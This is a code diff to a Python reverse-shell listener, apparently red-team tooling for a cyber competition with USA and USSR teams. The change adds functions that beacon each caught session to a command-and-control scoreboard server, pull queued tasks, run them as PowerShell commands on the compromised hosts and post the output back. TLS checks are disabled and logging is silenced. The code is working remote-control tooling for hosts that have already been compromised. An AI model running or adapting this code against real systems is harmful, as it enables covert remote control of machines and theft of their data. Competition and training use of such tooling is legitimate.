@@ -5,32 +5,6 @@ import threading
 
 PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
-# sends a powershell command to the target box and returns the output
-def send_command(ip, command):
-    try:
-        with sessions_lock:
-            if ip not in sessions:
-                return "[!] No active session"
-            conn = sessions[ip]["conn"]
-
-        conn.send((command + "\n").encode("utf-8"))
-        time.sleep(3)
-
-        response = b""
-        conn.settimeout(5)
-        try:
-            while True:
-                chunk = conn.recv(8192)
-                if not chunk:
-                    break
-                response += chunk
-        except socket.timeout:
-            pass
-
-        return response.decode("utf-8", errors="ignore")
-    except Exception as e:
-        return f"[!] Send failed: {e}"
-
 NAME_POOLS = {
     "USA": [
         "james_brooks", "michael_reed", "david_lane", "robert_hayes",
@@ -51,6 +25,185 @@ NAME_POOLS = {
 sessions = {}
 sessions_lock = threading.Lock()
 
+#####################
+# Whackamole Funcs
+#####################
+
+import json, urllib, ssl
+
+SERVER_URL="https://127.0.0.1:8000/"
+AGENT_TYPE="darius_c2"
+AUTH_TOKEN="abc_123"
+AUTH_TOKEN_DEFAULT="abc_123"
+AUTH_TOKEN_LOCK = threading.Lock()
+
+# Allow connection to the server (uses a self signed cert)
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode = ssl.CERT_NONE
+
+def print_debug(message):
+    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
+    # For example, if you have a DEBUG flag set, then print to console/logfile.
+    # Otherwise (full deploy for comp), suppress output.
+    #print(message)
+    pass
+
+def send_message(agent_ip,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
+    """
+    Sends the specified data to the server.
+    Handles the full process and attaching agent name/auth/system details.
+
+    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
+    Returns: status(Bool)
+    """
+    global AUTH_TOKEN
+    if not SERVER_URL:
+        # Server comms are intentionally disabled (server_url is an empty string)
+        # Maybe redirect to print_debug instead?
+        return False, "no SERVER_URL value specified"
+
+    try:
+        url = SERVER_URL + endpoint
+
+        # Prep payload
+        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
+        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
+        # assembly logic of the payload, so we attach the same data to every communication.
+        payload = {
+            "name": f"agent_{agent_ip}",
+            "hostname": "N/A", #systemInfo["hostname"],
+            "ip": agent_ip, #systemInfo["ipadd"],
+            "os": "N/A", #
+            "executionUser": "N/A", #systemInfo["executionUser"],
+            "executionAdmin": True, #systemInfo["executionAdmin"],
+            "auth": AUTH_TOKEN,
+            "agent_type": AGENT_TYPE,
+            "oldStatus": oldStatus,
+            "newStatus": newStatus,
+            "message": message
+        }
+
+        # Prepare data as JSON for transmit
+        data = json.dumps(payload).encode("utf-8")
+
+        # Build request
+        req = urllib.request.Request(
+            url,
+            data=data,
+            headers={"Content-Type": "application/json"},
+            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
+        )
+
+        # Send payload
+        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
+            if response.getcode() == 200:
+                # Good result! Now parse and return the endpoint
+                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
+                response_text = response.read().decode('utf-8')
+                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
+                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
+                if "agent/beacon" in endpoint:
+                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
+                        if response_text != AUTH_TOKEN:
+                            with AUTH_TOKEN_LOCK:
+                                AUTH_TOKEN = response_text
+                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
+                return True, response_text
+            else:
+                print_debug(f"send_message({url}): Server error: {response.getcode()}")
+
+    # Error handling
+    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
+    except urllib.error.HTTPError as e:
+        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
+    except urllib.error.URLError as e:
+        print_debug(f"send_message({url}): URL error: {e.reason}")
+    except Exception as e:
+        print_debug(f"send_message({url}): Beacon error: {e}")
+    return False, ""
+
+def pwnboard_agent(agent_ip):
+    # Handles keepalives and tasking for a single agent for a single iteration. Should be ran threaded.
+    # Only checks for a single command each iteration.
+    status, response = send_message(agent_ip,"agent/beacon","keepalive")
+    status, response = send_message(agent_ip,"agent/get_task")
+    if status: # Check that communication was successful
+        if response != "no pending tasks":
+            # We have a task waiting! Let's decode it (see API spec document):
+            data = json.loads(response)
+            task_id = data.get('task_id')
+            task_command = data.get('task')
+            try:
+                result = send_command(agent_ip, task_command)
+            except Exception as E:
+                # Always account for weird errors (or a simple timeout) when you least expect it!
+                # Don't leave the server hanging:
+                print_debug(f"subprocess exception: {E}")
+                result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
+            finally:
+                # Now, we'll send the result back to the server
+                resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
+                status, response = send_message(agent_ip,"agent/set_task_result",message=resultjson)
+
+def pwnboard_loop():
+    # Spawns keepalive/task threads
+    while True:
+        with sessions_lock:
+            # Copy a list of tuples (ip, connection) so we can release the lock ASAP
+            active_ips = list(sessions.keys())
+        
+        threads = []
+        for ip in active_ips:
+            # Create a dedicated thread for this specific agent's turn and run them simultaneously
+            t = threading.Thread(target=pwnboard_agent, args=(ip,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        # wait for all agent threads to finish to avoid threat overload if one is hanging too much
+        # for t in threads:
+        #     t.join(timeout=10) # Wait up to 10 seconds per thread
+
+        time.sleep(60) # wait for next iteration
+
+#####################
+# End Whackamole Funcs
+##################### 
+
+# sends a powershell command to the target box and returns the output
+def send_command(ip, command):
+    try:
+        with sessions_lock:
+            if ip not in sessions:
+                return "[!] No active session"
+            conn = sessions[ip]["conn"]
+
+        conn.send((command + "\n").encode("utf-8"))
+        #time.sleep(3)
+
+        response = b""
+        conn.settimeout(2)
+        try:
+            while True:
+                chunk = conn.recv(8192)
+                if not chunk: # Connection closed
+                    remove_session(ip)
+                    return "[!] Connection closed by peer."
+                response += chunk
+                # set a very short timeout for subsequent chunks. if no more data arrives in 0.5s, we can assume the command is done.
+                conn.settimeout(0.5) 
+        except socket.timeout:
+            # this is expected when the remote side finishes sending output
+            pass
+
+        return response.decode("utf-8", errors="ignore")
+    except (socket.error, BrokenPipeError, ConnectionResetError):
+        # purge the dead session if there's a network error (such as the client disconnecting)
+        remove_session(ip)
+        return "[!] Connection lost. Session removed."
+    except Exception as e:
+        return f"[!] Send failed: {e}"
+
 # registers a new incoming connection into the sessions dictionary, and replacing stale ones
 def register_session(ip, conn, port):
     with sessions_lock:
@@ -60,8 +213,9 @@ def register_session(ip, conn, port):
             except Exception:
                 pass
         sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
-        print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
-        print("    Type 'sessions' at any prompt to see all active connections.")
+    print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
+    print("    Type 'sessions' at any prompt to see all active connections.")
+    status, response = send_message(ip,"agent/beacon","register")
 
 # based on the IP subnet, automatically sets the session as either USA or USSR for name pool
 def guess_team(ip):
@@ -281,6 +435,8 @@ def main():
     start_listeners()
     print(f"[*] Listening on ports: {PORTS}")
     print("[*] Waiting for callbacks...\n")
+    pwnboard_loop_thread = threading.Thread(target=pwnboard_loop, args=(), daemon=True)
+    pwnboard_loop_thread.start()
     sessions_menu()
 
 if __name__ == "__main__":
